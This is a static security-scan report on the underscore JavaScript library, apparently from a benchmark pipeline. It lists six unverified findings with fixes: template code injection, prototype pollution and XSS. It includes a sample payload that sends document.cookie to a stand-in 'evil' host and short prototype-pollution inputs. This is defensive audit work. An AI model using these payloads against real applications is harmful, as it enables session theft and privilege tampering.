# Vuln-Scan Findings: underscore

Static review (read-only, `--single`), scoped by `THREAT_MODEL.md`. 6 findings
across 5 focus areas, from the security-relevant `modules/` source. These are
**static candidates**, not verified — see `/triage`.

| id | severity | category | file:line | confidence | title |
|---|---|---|---|---|---|
| F-001 | HIGH | code-injection | modules/template.js:87 | 0.6 | `_.template` compiles caller text to code via `new Function` |
| F-002 | HIGH | prototype-pollution | modules/_createAssigner.js:13 | 0.5 | Prototype pollution via `_.extend`/`_.defaults` `__proto__` key |
| F-003 | MEDIUM | prototype-pollution | modules/invert.js:8 | 0.45 | Prototype pollution in `_.invert` via attacker value `__proto__` |
| F-004 | MEDIUM | xss | modules/template.js:59 | 0.4 | Unescaped `<%= %>` interpolation emits raw HTML |
| F-005 | LOW | prototype-pollution | modules/result.js:14 | 0.3 | `_.result` walks attacker path incl. `__proto__`/`constructor` |
| F-006 | LOW | xss | modules/_escapeMap.js:1 | 0.3 | `_.escape` does not encode `/` |

### F-001 — `_.template` compiles caller-supplied template text to executable code
`modules/template.js:87` · code-injection · HIGH · confidence 0.6

template() builds a function body from the template string (template.js:50-83)
and compiles it with `new Function(argument, '_', source)`. Any `<% %>` evaluate
or `<%= %>` interpolate block is concatenated verbatim into `source`, so the
template string is effectively eval'd in the host realm. If any portion of the
template text is attacker-controlled, the attacker runs arbitrary JS.

- **Exploit:** App renders a user-supplied string with `_.template(userString)({...})`; user submits `<% fetch('//evil/?c='+document.cookie) %>`.
- **Fix:** Never pass untrusted input as the template string; precompile from trusted source. Documented design contract (SECURITY.md) — triage may rule intended behavior.

### F-002 — Prototype pollution via `_.extend` / `_.defaults`
`modules/_createAssigner.js:13` · prototype-pollution · HIGH · confidence 0.5

createAssigner assigns `obj[key] = source[key]`. A source object parsed from
untrusted JSON with a `__proto__` own-enumerable key makes the bracket
assignment invoke the prototype setter, mutating `Object.prototype`.

- **Exploit:** `_.defaults(config, JSON.parse('{"__proto__":{"isAdmin":true}}'))` poisons every object in the realm.
- **Fix:** Filter `__proto__`/`constructor`/`prototype`, or use `Object.create(null)`/Map for untrusted data.

### F-003 — Prototype pollution in `_.invert`
`modules/invert.js:8` · prototype-pollution · MEDIUM · confidence 0.45

`result[obj[_keys[i]]] = _keys[i]` uses each input VALUE as a key on the result
object. A value of `'__proto__'` targets the prototype setter.

- **Exploit:** `_.invert(JSON.parse('{"x":"__proto__"}'))`.
- **Fix:** Sanitize dangerous resolved keys, or build with `Object.create(null)`.

### F-004 — Unescaped `<%= %>` interpolation
`modules/template.js:59` · xss · MEDIUM · confidence 0.4

The interpolate branch emits values raw, unlike the escape branch (line 57)
which routes through `_.escape`. Untrusted data via `<%= %>` written into the
DOM yields XSS.

- **Fix:** Use the escaping delimiter `<%- %>` / `_.escape` for untrusted interpolation.

### F-005 — `_.result` path traversal of reserved keys
`modules/result.js:14` · prototype-pollution · LOW · confidence 0.3

`obj[path[i]]` resolves attacker path segments with no key filtering and invokes
function values (line 19). A read/traverse primitive that can surface prototype
properties / the Function constructor in a gadget chain. Low impact (no write).

### F-006 — `_.escape` omits the forward slash
`modules/_escapeMap.js:1` · xss · LOW · confidence 0.3

The escape map covers `& < > " ' \`` but not `/`. Safe in standard HTML body
context; defense-in-depth only for script/attribute contexts.

---
**Next:** `/triage benchmarks/anthropics/fable/underscore/VULN-FINDINGS.json --repo underscore`
These are static candidates; for execution-verified findings use `vuln-pipeline`.
